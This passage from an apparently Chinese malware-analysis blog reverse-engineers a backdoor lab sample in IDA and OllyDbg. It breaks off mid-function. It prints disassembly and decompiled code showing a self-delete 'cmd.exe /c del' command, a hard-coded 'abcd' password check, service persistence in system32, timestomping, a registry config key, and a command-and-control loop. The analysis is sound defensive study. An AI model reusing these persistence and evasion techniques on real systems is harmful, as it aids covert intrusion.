class="line">.text:004024A4                 rep movsb</span><br><span class="line">.text:004024A6                 mov     edi, offset aNul ; &quot; &gt;&gt; NUL&quot;</span><br><span class="line">.text:004024AB                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:004024B1                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024B4                 xor     eax, eax</span><br><span class="line">.text:004024B6                 repne scasb</span><br><span class="line">.text:004024B8                 not     ecx</span><br><span class="line">.text:004024BA                 sub     edi, ecx</span><br><span class="line">.text:004024BC                 mov     esi, edi</span><br><span class="line">.text:004024BE                 mov     ebx, ecx</span><br><span class="line">.text:004024C0                 mov     edi, edx</span><br><span class="line">.text:004024C2                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024C5                 xor     eax, eax</span><br><span class="line">.text:004024C7                 repne scasb</span><br><span class="line">.text:004024C9                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:004024CC                 mov     ecx, ebx</span><br><span class="line">.text:004024CE                 shr     ecx, 2</span><br><span class="line">.text:004024D1                 rep movsd</span><br><span class="line">.text:004024D3                 mov     ecx, ebx</span><br><span class="line">.text:004024D5                 and     ecx, 3</span><br><span class="line">.text:004024D8                 rep movsb</span><br><span class="line">.text:004024DA                 push    0               ; nShowCmd</span><br><span class="line">.text:004024DC                 push    0               ; lpDirectory</span><br><span class="line">.text:004024DE                 lea     eax, [ebp+Parameters]</span><br><span class="line">.text:004024E4                 push    eax             ; lpParameters</span><br><span class="line">.text:004024E5                 push    offset File     ; &quot;cmd.exe&quot;</span><br><span class="line">.text:004024EA                 push    0               ; lpOperation</span><br><span class="line">.text:004024EC                 push    0               ; hwnd</span><br><span class="line">.text:004024EE                 call    ds:ShellExecuteA</span><br><span class="line">.text:004024F4                 push    0               ; Code</span><br><span class="line">.text:004024F6                 call    _exit</span><br><span class="line">.text:004024F6 sub_402410      endp</span><br></pre></td></tr></table></figure>

<p>看到它调用<code>GetModuleFileNameA</code>获取当前可执行文件的路径，接着调用<code>GetShortPathNameA</code>函数获取缩写的全路径字符串，构造完整的字符串即<code>/c del path-to-executable &gt;&gt;NUL</code>，下面调用<code>ShellExecuteA</code>函数打开cmd命令行，参数是前面构造的字符串，即从硬盘中删除自己。因为在od中已经打开了该文件，当然是删除失败的。</p>
<p>因为<code>filename</code>在栈空间，载入内存才直到它是什么。</p>
<p>先找到 <code>ebp</code>寄存器的地址，再减去<code>208h</code></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117104049309.png" alt="image-20211117104049309"></p>
<p>但是因为我对od使用不熟悉，ebp没有找到有用的东西。™的在ecx中找到了…，其实也可以对应上，调用<code>GetModuleFilenameA</code>后，<code>filename</code>会赋值给<code>ecx</code>，也算是找到了当前路径。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117110341950.png"></p>
<p>那就可以结合ida中的字符串，拼接一下<code>cmd.exe /c del c:\Users\adninistrator\Desktop\BinaryCollection\Chapter_9L\Lab09-01-cracked.exe&gt;&gt;NUL</code>  即删除自身</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117113544736.png" alt="image-20211117113544736"></p>
<table>
<thead>
<tr>
<th>命令行选项</th>
<th>地址</th>
<th>行为</th>
</tr>
</thead>
<tbody><tr>
<td>-in</td>
<td>0x402600</td>
<td>安装服务</td>
</tr>
<tr>
<td>-re</td>
<td>0x402900</td>
<td>卸载服务</td>
</tr>
<tr>
<td>-c</td>
<td>0x401070</td>
<td>设置注册表配置键</td>
</tr>
<tr>
<td>-cc</td>
<td>0x401280</td>
<td>打印注册表配置键</td>
</tr>
</tbody></table>
<p>在main函数中，不难找到几处对<code>__mbscmp</code>函数的调用，整理下该函数调用的参数</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117111630925.png" alt="image-20211117111630925"></p>
<h3 id="in"><a href="#in" class="headerlink" title="-in"></a>-in</h3><p>下一步应该是为了让这个程序能正常运行。这里给程序启动添加个参数，使其正常运行。修改注册表的代码路径应该也是可以的，但是修改注册表属于高危操作，很容易产生意外后果，所以这里先添加启动参数试试，这样就满足了<code>402AFD</code>的cmp，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121130243.png" alt="image-20211116121130243"></p>
<p>添加 <code>-in</code>参数试试，这里为什么添加 <code>-in</code>参数，可以跳转到 <code>0x03 命令行分析</code>处</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121243071.png" alt="image-20211116121243071"></p>
<p>看到还是会跳到 <code>402410</code>，尝试删除自己，那说明我们添加的参数没起作用啊</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121949288.png" alt="image-20211116121949288"></p>
<p>在<code>402B2E</code>处，最后一个命令行参数被传入到 <code>402510</code>处，这是最后一个参数，因为C程序的main函数只有两个参数: argc和argv，argc是参数的个数，argv是指向命令行参数的一个指针。EAX包含argc，ECX包含argv。在<code>402B23</code>处，<code>ecx+eax*4-4</code>这个指针选择命令行参数数组中的最后一个元素，最后在 eax中，并且在函数调用之前push入栈</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116143954688.png" alt="image-20211116143954688"></p>
<p>接着往下，来到<code>402B2E</code>处，函数调用 <code>402510</code></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116145310014.png" alt="image-20211116145310014"></p>
<p>在ida中看看，很奇怪，这里没有函数调用，只有一系列算术操作。<code>add/xor/cmp/</code>，检查输入得到是否是4个字符，如果是的话，跳转到<code>40252D</code>处，而这里，又开始和字符‘a’进行比较，顺着往下全面分析的话，可以看出它检验输入的字符是不是 <code>abcd</code>，很明显，这里做了密码校验。到这里就可以猜测，添加了命令行参数仍然跳转的原因，因为做了密码校验。</p>
<p>f5看下反汇编，这里我就直接贴代码了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __cdecl <span class="title">sub_402510</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1) != <span class="number">4</span> )				<span class="comment">//校验4位长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)a1 != <span class="number">97</span> )							<span class="comment">//a</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = *(_BYTE *)(a1 + <span class="number">1</span>) - *(_BYTE *)a1;			<span class="comment">//b</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">99</span> * v2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == *(<span class="keyword">char</span> *)(a1 + <span class="number">2</span>) )					<span class="comment">//c</span></span><br><span class="line">    result = (<span class="keyword">char</span>)(v3 + <span class="number">1</span>) == *(<span class="keyword">char</span> *)(a1 + <span class="number">3</span>);	<span class="comment">//d</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>进入<code>402510</code>调试</p>
<p>可以看到返回值是0，因为密码校验错误嘛，输入的不是 abcd，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117114542540.png" alt="image-20211117114542540"></p>
<p>这里直接修改寄存器的返回值，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115033632.png" alt="image-20211117115033632"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115200115.png" alt="image-20211117115200115"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115243204.png" alt="image-20211117115243204"></p>
<p>接着看 在调用<code>GetModuleFileNameA</code>后，接着调用了<code>splitpath</code>函数来获取当前文件路径</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117145158822.png" alt="image-20211117145158822"></p>
<p>接着往下，<code>alloca_probe</code>是在栈空间申请内存的函数，<code>sub_4025B0</code>我们知道是一个截取文件路径的函数，<code>402632</code>看来是先取一下<code>system32</code>目录。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117150722663.png" alt="image-20211117150722663"></p>
<p>继续续调试，进入 <code>4026cc</code>，来ida中看</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172953326.png" alt="image-20211116172953326"></p>
<p>调用<code>OpenSCManagerA</code>，打开一个服务管理器，创建一个服务，并添加进启动项，并且将自己复制到 <code>%SYSTEMROOT%\\system32\\xxx</code>，即写进system32目录</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116173821127.png" alt="image-20211116173821127"></p>
<p>要想知道启动的什么服务的话，只能在内存中看，这里很明显，启动的服务是自己</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117152044299.png" alt="image-20211117152044299"></p>
<p>接着在下面调用<code>ChangeServiceConfigA</code>函数，可以看下它的参数。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153003646.png" alt="image-20211117153003646"></p>
<p>接着跳着就跳出了main函数，就shutdown了？？ 这里注意到，这些函数只是打开并且安装服务，但是并没有创建服务，因为我们没找到<code>CreateServiceA</code>函数，按理来说创建服务的话，应该都是有这个函数的。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153851502.png" alt="image-20211117153851502"></p>
<p>我们看到ida里是有这个函数的。这里在od中没出现是因为，在调试的过程中，step in很多次，已经创建了该服务，所以od没有进入该函数。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153921844.png" alt="image-20211117153921844"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117154049962.png" alt="image-20211117154049962"></p>
<p>继续看。在<code>40380F</code>处调用 __mbscmp函数</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172003090.png" alt="image-20211116172003090"></p>
<p>这是一个选择循环结构，根据__mbscmp函数的匹配结果来决定执行语句</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172353688.png" alt="image-20211116172353688"></p>
<p><code>4015B0</code>处的<code>GetSystemDirectory</code>，这个函数能取得Windows系统目录（System目录）的完整路径名。在这个目录中，包含了所有必要的系统文件。根据微软的标准，其他定制控件和一些共享组件也可放到这个目录。通常应避免在这个目录里创建文件。在网络环境中，往往需要管理员权限才可对这个目录进行写操作。 </p>
<p>这个函数主要是用来修改 复制文件、访问和最后变化的时间戳，来与<code>Kernel32.dll</code>保持一致。这个修改时间戳来和其他文件保持一致的技术叫<code>timestomping</code>，网上也有打包好的工具，自己写也很简单。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116173949704.png" alt="image-20211116173949704"></p>
<p>这里 <code>4011A8</code>创建注册表项<code>HKLM\SOFTWARE\Microsoft \\xps</code>，空格是为了让它显示更独特，可以看出是受感染的主机。接着在 <code>4011BE</code>处，edx寄存器指向 Data缓冲区，用来存储注册表项下 名为<code>Configuration</code>的键值。但是缓冲区的内容是什么呢？我们在<code>4011BE</code>处设置断点，然后F9进入执行，查看寄存器EDX的值，就可以看到加载到内存中的字符串。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116180114934.png" alt="image-20211116180114934"></p>
<p>进入<code>ShellExecuteA</code>处，删除自身，接着退出程序</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117171453200.png" alt="image-20211117171453200"></p>
<h3 id="re"><a href="#re" class="headerlink" title="-re"></a>-re</h3><p>传参改为-re继续调试</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155145688.png" alt="image-20211117155145688"></p>
<p>一步步step in</p>
<p>又是<code>402510</code>，这里前面已经分析过，是进行密码校验，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155443290.png" alt="image-20211117155443290"></p>
<p>go on ，这里有一个<code>402900</code>，看看</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155628148.png" alt="image-20211117155628148"></p>
<p>调用了<code>DeleteService</code>函数，删除指定的服务</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155715725.png" alt="image-20211117155715725"></p>
<p>可以看出是将自己删除了</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155916159.png" alt="image-20211117155916159"></p>
<p>继续</p>
<p>后面调用了<code>ExpandEnvironmentStringsA</code>函数，扩展环境可变字符串，并将其替换为当前用户定义的值，这里就是将该字符串替换为空，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160129452.png" alt="image-20211117160129452"></p>
<p>删除自己</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160405653.png" alt="image-20211117160405653"></p>
<p>接着就结束了，这是re的功能：删除服务并且删除自身文件</p>
<h3 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h3><p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160524042.png" alt="image-20211117160524042"></p>
<p>这里注意刚刚执行-re的时候已经删除了服务，所以要先执行-in 来安装服务，这里也是找到了前面没发现的<code>CreateServiceA</code>函数</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160800094.png" alt="image-20211117160800094"></p>
<p>这里就直接挑关键的分析</p>
<p>一路f7，来到这里就可以确定是目的地了</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117161510708.png" alt="image-20211117161510708"></p>
<p>大概看一看这个函数的功能，发现跳转了4个地址，逐个看看</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117161739076.png" alt="image-20211117161739076"></p>
<p><code>402cd9</code>这里应该就是检验输入的字符串是不是-cc，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117162149075.png" alt="image-20211117162149075"></p>
<p><code>402ccf</code>这里判断参数个数是否为7</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117162356923.png" alt="image-20211117162356923"></p>
<p><code>401070</code>这里可以看到就是对注册表的操作了</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117163119830.png" alt="image-20211117163119830"></p>
<p>调用<code>RegOpenKeyExA</code>，尝试打开注册表项 <code>HKLM\SOFTWARE\Microsoft \ \XPS</code>，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095906406.png" alt="image-20211117095906406"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116113808502.png" alt="image-20211116113808502"></p>
<p>对-c 参数的分析就到这里，可以清楚它的功能是设置注册表项。</p>
<h3 id="cc"><a href="#cc" class="headerlink" title="-cc"></a>-cc</h3><p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172231871.png" alt="image-20211117172231871"></p>
<p>看到它调用的参数，<code>401028</code>这里。调用<code>RegQueryValueExA</code>函数，读取配置注册表的键值内容，并且将读取的数值放在缓冲区中，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172440164.png" alt="image-20211117172440164"></p>
<p>在od中可以直接查看调用的参数</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172810303.png" alt="image-20211117172810303"></p>
<p>查询注册表项的配置文件</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172934212.png" alt="image-20211117172934212"></p>
<p>再来到ida中看细节，单步跟进，这里我浪费了很长时间，一点点看细节没有收获，直接跳到最后看函数返回值</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173449780.png" alt="image-20211117173449780"></p>
<p>看样子像字符串拼接，和printf类似，跳转到call的地址</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173633852.png" alt="image-20211117173633852"></p>
<p>f5看下反汇编，看来就是printf输出打印</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173830307.png" alt="image-20211117173830307"></p>
<p>打印一下试试，果然，不过这些字符串，有域名，其他的看着像端口什么的。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117174117602.png" alt="image-20211117174117602"></p>
<p>ok，-cc命令的作用就到这里，读取注册表中的项的内容并输出。</p>
<h3 id="无参"><a href="#无参" class="headerlink" title="无参"></a>无参</h3><p>又回到了<code>401000</code>，往下找，跳到 <code>432060</code></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117175420932.png" alt="image-20211117175420932"></p>
<p>f5反汇编，一直在while循环，但是并没有终止条件。</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117175456369.png" alt="image-20211117175456369"></p>
<p>来到<code>401640</code>，终于建立网络连接了，但是我机器断网的原因，这里返回false</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117231628485.png" alt="image-20211117231628485"></p>
<p>调用<code>send</code>函数，传入的参数是buf，即之前获取的注册表配置信息</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117231732413.png" alt="image-20211117231732413"></p>
<p>后面还有个<code>recv</code>函数，用来接收信息，接着做了一个比较，判断长度是否小于0，如果是，跳转到<code>401CAD</code>中，否则继续执行，跳转到</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117232340334.png" alt="image-20211117232340334"></p>
<p>跳转到<code>401F10</code>处，调用了<code>strstr</code>，用来匹配字符串</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117233653687.png" alt="image-20211117233653687"></p>
<p><code>401E60</code>处的伪代码，可以结合上面的分析来总结下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401E60</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  u_short hostshort[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-1424h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-1420h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [esp+40Ch] [ebp-1020h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+410h] [ebp-101Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+414h] [ebp-1018h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">4</span>]; <span class="comment">// [esp+418h] [ebp-1014h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [esp+428h] [ebp-1004h]</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">4096</span>]; <span class="comment">// [esp+42Ch] [ebp-1000h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401420</span>(name, <span class="number">1024</span>) )				<span class="comment">//获取并截取注册表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401470</span>(hostshort) )				<span class="comment">//获取注册表键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401D80</span>(v8) )						<span class="comment">//延时</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401AF0</span>(name, hostshort[<span class="number">0</span>], (<span class="keyword">int</span>)v8, Str, (<span class="keyword">int</span>)&amp;v6) )			<span class="comment">//建立socket通信并recv</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="built_in">strstr</span>(Str, asc_40C090);				<span class="comment">//匹配字符串</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v5 = v9;</span><br><span class="line">  v9 = <span class="built_in">strstr</span>(v9, asc_40C088);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v7 = v9;</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v5 + <span class="number">1</span> &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(a1, &amp;v5[<span class="built_in">strlen</span>(asc_40C090)], v7 - v5 - <span class="built_in">strlen</span>(asc_40C090));</span><br><span class="line">  a1[v7 - v5 - <span class="built_in">strlen</span>(asc_40C090)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要的功能就是用来获取字符串，如果获取成功，进入<code>40204c</code>，发现了sleep，upload等字样，f5看下伪代码</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117234434791.png" alt="image-20211117234434791"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_402020</span><span class="params">(<span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  u_short hostshort; <span class="comment">// [esp+4h] [ebp-424h]</span></span><br><span class="line">  FILE *Stream; <span class="comment">// [esp+8h] [ebp-420h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Command; <span class="comment">// [esp+Ch] [ebp-41Ch]</span></span><br><span class="line">  u_short v8; <span class="comment">// [esp+10h] [ebp-418h]</span></span><br><span class="line">  <span class="keyword">char</span> *lpFileName; <span class="comment">// [esp+14h] [ebp-414h]</span></span><br><span class="line">  u_short v10; <span class="comment">// [esp+18h] [ebp-410h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [esp+1Ch] 